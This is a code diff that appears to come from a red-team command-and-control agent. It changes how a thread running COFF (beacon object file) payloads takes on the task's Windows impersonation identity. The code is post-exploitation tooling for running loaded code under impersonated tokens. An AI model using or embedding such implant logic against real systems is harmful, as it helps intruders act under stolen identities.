@@ -989,7 +989,6 @@ namespace Tasks
         // Class to hold the state for COFF execution thread
         private class COFFExecutionState
         {
-            public IAgent Agent { get; set; }
             public string FunctionName { get; set; }
             public IntPtr CoffData { get; set; }
             public uint FileSize { get; set; }
@@ -1005,23 +1004,18 @@ namespace Tasks
         private static void ExecuteCOFFThreadFunc(object state)
         {
             COFFExecutionState executionState = (COFFExecutionState)state;
-            IAgent agent = executionState.Agent;
             try
             {
                 DebugHelp.DebugWriteLine($"Starting COFF execution in thread {Thread.CurrentThread.ManagedThreadId}");
-                if (!agent.GetIdentityManager().IsOriginalIdentity())
+                // Thread.Start carries the task's managed impersonation context. Capture that
+                // effective identity instead of re-reading the agent's mutable global selection.
+                using (WindowsIdentity impersonationIdentity = WindowsIdentity.GetCurrent())
                 {
-                    WindowsIdentity impersonationIdentity = agent.GetIdentityManager().GetCurrentImpersonationIdentity();
                     DebugHelp.DebugWriteLine($"Applying impersonation identity {impersonationIdentity.Name} to COFF execution thread");
                     ApolloInterop.Classes.Impersonation.ImpersonationScope.Run(impersonationIdentity, () =>
                     {
                         ExecuteRunCoff(executionState);
                     });
-                }
-                else
-                {
-                    DebugHelp.DebugWriteLine("Using original identity for COFF execution");
-                    ExecuteRunCoff(executionState);
                 }
 
             }
@@ -1134,7 +1128,6 @@ namespace Tasks
                 // Create execution state object
                 COFFExecutionState executionState = new COFFExecutionState
                 {
-                    Agent = _agent,
                     FunctionName = parameters.FunctionName,
                     CoffData = RunCOFFinputBuffer,
                     FileSize = (uint)coffBytes.Length,
